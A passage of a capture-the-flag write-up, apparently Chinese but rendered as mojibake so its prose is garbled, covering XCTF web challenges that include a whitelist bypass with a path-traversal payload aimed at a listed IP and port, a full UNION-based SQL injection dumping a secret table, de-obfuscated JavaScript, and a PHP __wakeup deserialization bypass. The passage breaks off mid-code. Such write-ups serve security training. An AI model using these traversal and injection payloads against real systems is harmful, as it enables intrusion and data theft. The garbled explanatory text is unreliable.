<p>å› ä¸ºè¯­å¥é‡Œå­˜åœ¨return falseï¼Œæ‰€ä»¥è¦ä¼ å…¥çš„<u>å˜é‡pageå­˜åœ¨ä¸”ä¸ºå­—ç¬¦ä¸²</u>ï¼Œä½¿å¾—ifè¯­å¥ä¸ºå‡ï¼Œå°±ä¸ä¼šæ‰§è¡Œreturn falseï¼Œè¿™ä¸ªæœ¬èº«å°±æ»¡è¶³ï¼Œæ‰€ä»¥å¯ä»¥ä¸è€ƒè™‘</p>
<p>ç¬¬äºŒä¸ªif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯source.phpæˆ–è€…hint.phpï¼Œæ»¡è¶³whitelist(ç™½åå•)ï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<p>ç¬¬ä¸‰ä¸ªifï¼Œç»“åˆå…¶å‰é¢ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">               <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">               //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>å–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<p>ç¬¬å››ä¸ªif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆæŠŠå‚æ•°è¿›è¡Œurlè§£ç ï¼Œç„¶åå’Œç¬¬ä¸‰ä¸ªifä¸€æ ·ï¼Œå–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<hr>
<p>è‡³äº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure>

<p>åªè¦fileä¸ä¸ºç©ºï¼Œä¸”ä¸ºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥æ»¡è¶³ä¸è€ƒè™‘</p>
<p>æ‰€ä»¥åªæœ‰ä¸‹é¢ä¸¤ç§</p>
<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>
<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>
<p>ç”±PHP4-7çš„includeå‡½æ•°çš„ç‰¹æ€§</p>
<p><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨payloadä¸ŠåŠ ä¸Š<code>/../../../../../../ffffllllaaaagggg</code>ï¼Œè¿™é‡Œå¯åªåŠ å››å±‚..&#x2F;å³å¯ï¼Œä½†ä¹Ÿå¯ä»¥åŠ å¤šä¸ªè¿”å›ä¸Šä¸ªç›®å½•ï¼Œä¹Ÿå¯ä»¥ä¾æ¬¡è¯•è¯•</p>
<p>å¾—åˆ°flag</p>
<p><strong>è¡¥å……</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ <span class="title function_ invoke__">substr</span>() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ <span class="title function_ invoke__">mb_substr</span>()ã€‚</span><br><span class="line">å®ä¾‹</span><br><span class="line">ä»å­—ç¬¦ä¸²ä¸­è¿”å› <span class="string">&quot;èœé¸Ÿ&quot;</span>ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;èœé¸Ÿæ•™ç¨‹&quot;</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// è¾“å‡ºï¼šèœé¸Ÿ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">----------------</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span>()ï¼šè¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line"><span class="title function_ invoke__">mb_strpos</span> (haystack ,needle )</span><br><span class="line">haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">----------------</span><br><span class="line"> in_arrayå‡½æ•°åŠŸèƒ½æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</span><br></pre></td></tr></table></figure>

<h2 id="11-NewsCenter"><a href="#11-NewsCenter" class="headerlink" title="11.NewsCenter"></a>11.NewsCenter</h2><h3 id="1-é¢˜ç›®æè¿°-20"><a href="#1-é¢˜ç›®æè¿°-20" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-5"><a href="#2ï¼‰wp-5" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜è€ƒæŸ¥çš„æ˜¯SQLæ³¨å…¥ï¼Œå¦‚æœä¸æ¸…æ¥šå¼€å§‹çœ‹åˆ°è¾“å…¥æ¡†ï¼Œå°±åº”è¯¥è¯•è¯•å„ç§æ–¹å¼ï¼Œåˆ†æå­˜åœ¨ä»€ä¹ˆæ¼æ´ï¼Œæ¯”å¦‚xssæˆ–sqlç­‰ç­‰</p>
<p>å¼€å§‹å…ˆåˆ¤æ–­sqlæ³¨å…¥å­˜åœ¨</p>
<p>è¾“å…¥**1â€™**ï¼ŒæŠ¥é”™è¿”å›ç©ºç™½é¡µé¢</p>
<p>ç„¶ååˆ¤æ–­å­—æ®µæ•°</p>
<p>å½“è¾“å…¥è¯­å¥ä¸º</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>è¿”å›ç©ºç™½é¡µé¢ï¼Œäºæ˜¯åˆ¤æ–­å­—æ®µæ•°ä¸º3</p>
<p>ç„¶åè”åˆæ³¨å…¥</p>
<p>å…ˆåˆ¤æ–­æ•°æ®çˆ†å‡ºå£</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20220703204402467.png" alt="image-20220703204402467"></p>
<p>å¾—å‡ºæ•°æ®åœ¨2ï¼Œ3ä½ç½®å¤„è¾“å‡º</p>
<p>ç„¶åæŒ‰ç…§æ ‡å‡†sqlæ³¨å…¥æµç¨‹å³å¯</p>
<p>å…ˆçœ‹æ•°æ®åº“å’Œç‰ˆæœ¬å·</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;  <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>(),<span class="built_in">version</span>()<span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20220703204520282.png" alt="image-20220703204520282"></p>
<p>å¾—åˆ°æ•°æ®åº“åä¸º<strong>news</strong>ï¼ŒMySQLç‰ˆæœ¬ä¸º<strong>5.5.61</strong></p>
<p>ç„¶åæŸ¥çœ‹newsåº“çš„è¡¨å</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&quot;news&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20220703205326915.png" alt="image-20220703205326915"></p>
<p>å¾—åˆ°ä¸¤ä¸ªè¡¨å<strong>news</strong>å’Œ<strong>secret_table</strong></p>
<p>flagè‚¯å®šåœ¨<strong>secret_table</strong>é‡Œ</p>
<p>æŸ¥çœ‹<strong>secret_table</strong>åˆ—</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&quot;secret_table&quot;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20220703205526044.png" alt="image-20220703205526044"></p>
<p>çœ‹åˆ°fl4gï¼Œå°è¯•æŸ¥çœ‹å…¶æ•°æ®</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span>  union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> fl4g  <span class="keyword">from</span> secret_table),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-Gongfang/image-20220703205758800.png" alt="image-20220703205758800"></p>
<p>å¾—åˆ°flag</p>
<p>è¿™é‡Œç”¨sqlmapä¹Ÿå¯ä»¥ï¼Œä½†è¿˜æ˜¯è¯•è¯•æ‰‹å·¥æ³¨å…¥æ›´å¥½</p>
<h2 id="12-NaNaNaNNaN-Batman"><a href="#12-NaNaNaNNaN-Batman" class="headerlink" title="12.NaNaNaNNaN-Batman"></a>12.NaNaNaNNaN-Batman</h2><h3 id="1-é¢˜ç›®æè¿°-21"><a href="#1-é¢˜ç›®æè¿°-21" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-6"><a href="#2ï¼‰wp-6" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™ä¸ªå¼€å§‹æœ‰ç‚¹æ‡µï¼Œå€Ÿé‰´äº†å¤§ä½¬çš„wpï¼Œæ‰ç†è§£äº†ä¸€äº›ï¼Œéœ€è¦wpå¯ä»¥è®¤çœŸçœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä»¥ä¸‹åªåŠ ä¸Šä¸ªäººç†è§£å’Œä¸ªäººè®¤ä¸ºæ–‡ç« é‡ç‚¹</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91946853">åŸæ–‡é“¾æ¥</a></p>
<p>jsæºä»£ç åˆ†æï¼š</p>
<p>_ç­‰äºä¸€ä¸ª$å‡½æ•°å†…å®¹</p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">_=&#x27;<span class="function"><span class="keyword">function</span> $<span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªè¾“å…¥æ¡†</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">id</span>=<span class="string">&quot;c&quot;</span>&gt;&lt; <span class="attribute">onclick</span>=$()&gt;Ok&lt;/&gt;\&#x27;);</span><br></pre></td></tr></table></figure>

<pre><code>***æ ¸å¿ƒä»£ç ï¼š***
evalå‡½æ•°ï¼Œè¿™æ˜¯æ‰§è¡Œå‡½æ•°ï¼›è¿™é‡Œæ‰§è¡Œäº†_å˜é‡ä¸­çš„å†…å®¹ä¹Ÿå°±æ˜¯&#39;&#39;ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥
è¿™é‡Œå¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥å°†ä¿®æ”¹åçš„æºä»£ç æ”¾å…¥æ§åˆ¶å°æ‰§è¡Œï¼ˆæ”¾å…¥æ§åˆ¶å°éœ€è¦æ³¨æ„åˆ é™¤scriptå‰åæ ‡ç­¾ï¼‰
</code></pre>
<p>æµè§ˆå™¨æ‰“å¼€ï¼š <img src="https://img-blog.csdnimg.cn/20200306183621819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function $()&#123;</span><br><span class="line">var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line">   if(e.match(/^be0f23/)!=null)</span><br><span class="line">      if(e.match(/233ac/)!=null)</span><br><span class="line">         if(e.match(/e98aa$/)!=null)</span><br><span class="line">             if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">             var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">             var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">             var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">             var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">             var s=[t,n,r,i];</span><br><span class="line">             for(var o=0;o&lt;13;++o)&#123;</span><br><span class="line">             document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</span><br><span class="line">             &#125;</span><br><span class="line">&#125;</span><br><span class="line">document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">Î¿nclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">delete _</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„ç»ˆæç›®æ ‡æ˜¯æ‰“å°å‡º</p>
<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>
<p>å› æ­¤æˆ‘ä»¬è¦æ»¡è¶³å…³é”®å˜é‡eçš„æ¡ä»¶</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼<br><u>^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aa</u>ï¼Œå…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±å¥½ï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚<br>äºæ˜¯æˆ‘ä»¬æ„é€ eçš„å€¼</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure>

<p>å°†ä¸Šé¢çš„æ ¸å¿ƒä»£ç åç¼€æ”¹ä¸ºhtmlæ ¼å¼ï¼Œæ‰“å¼€å¦‚ä¸‹å›¾æ‰€ç¤º<br>åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°<br>æ¡†ä¸­è¾“å…¥eçš„å€¼<code>be0f233ac7be98aa</code>ï¼Œç‚¹å‡»Okï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨åŸæ¥è·å¾—çš„web100æ–‡ä»¶æµè§ˆå™¨æ‰§è¡Œçš„è¾“å…¥æ¡†ä¸­è¾“å…¥be0f233ac7be98aaï¼‰</p>
<p><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><strong>æ³¨1ï¼šå½“ç„¶ï¼Œå¦‚æœå¤§å®¶è§‰å¾—æ„é€ éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œè·å–flagçš„æ ¸å¿ƒä»£ç ï¼Œä»£ç å¦‚ä¸‹</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>è¾“å‡ºfl;éšååˆ é™¤fl</span><br><span class="line">/*</span><br><span class="line">ä»£ç è¿è¡Œè¯¦è§£ï¼š</span><br><span class="line">ç¬¬ä¸€æ­¥ï¼šdocument.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬äºŒæ­¥ï¼šdocument.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬ä¸‰æ­¥ï¼šdocument.write(<span class="string">&quot;fl&quot;</span>);åˆ é™¤t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]ä¸­ç¬¬ä¸€ä¸ªä½ç½®ï¼Œä¸€ä¸ªé¡¹ç›®ï¼Œå³åˆ é™¤fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">document.writeçš„åŠŸèƒ½å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> æ–¹æ³•å‘/ä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚</span><br><span class="line">æ³¨é‡Šï¼šè¯¥æ–¹æ³•ä¼šæ”¹å˜åŸå§‹æ•°ç»„ã€‚</span><br><span class="line">è¯­æ³•</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">å‚æ•°	                         æè¿°</span><br><span class="line">index	                     å¿…éœ€ã€‚æ•´æ•°ï¼Œè§„å®šæ·»åŠ /åˆ é™¤é¡¹ç›®çš„ä½ç½®ï¼Œä½¿ç”¨è´Ÿæ•°å¯ä»æ•°ç»„ç»“å°¾å¤„è§„å®šä½ç½®ã€‚</span><br><span class="line">howmany	                     å¿…éœ€ã€‚è¦åˆ é™¤çš„é¡¹ç›®æ•°é‡ã€‚å¦‚æœè®¾ç½®ä¸º <span class="number">0</span>ï¼Œåˆ™ä¸ä¼šåˆ é™¤é¡¹ç›®ã€‚</span><br><span class="line">item1, ..., itemX	         å¯é€‰ã€‚å‘æ•°ç»„æ·»åŠ çš„æ–°é¡¹ç›®ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-é¢˜ç›®æè¿°-22"><a href="#1-é¢˜ç›®æè¿°-22" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-7"><a href="#2ï¼‰wp-7" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜éœ€è¦äº†è§£<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ä¸­__wakeupæ¼æ´çš„åˆ©ç”¨,è¿˜æœ‰<a href="../../../../2022/05/28/Web-study">phpé­”æœ¯æ–¹æ³•</a></p>
<p><code>__wakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p>
<p>å¼€å§‹çš„ä»£ç ä¸å®Œæ•´ï¼Œæ˜¯ä¸€æ®µæ®‹ç¼ºçš„PHPä»£ç ï¼Œæ ¹æ®é¢˜ç›®åå­—çŸ¥é“è¿™æ˜¯ç»™ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œ?code&#x3D;å¯èƒ½æ˜¯æé†’éœ€è¦åœ¨urlåˆ©ç”¨ä»¥GETæ–¹å¼æäº¤codeå€¼</p>
<p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ä¸‹æ–¹æ˜¯æŠŠä»£ç è¡¥å……å®Œå–„åï¼Œå¹¶å¹¶è°ƒç”¨åºåˆ—åŒ–å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span 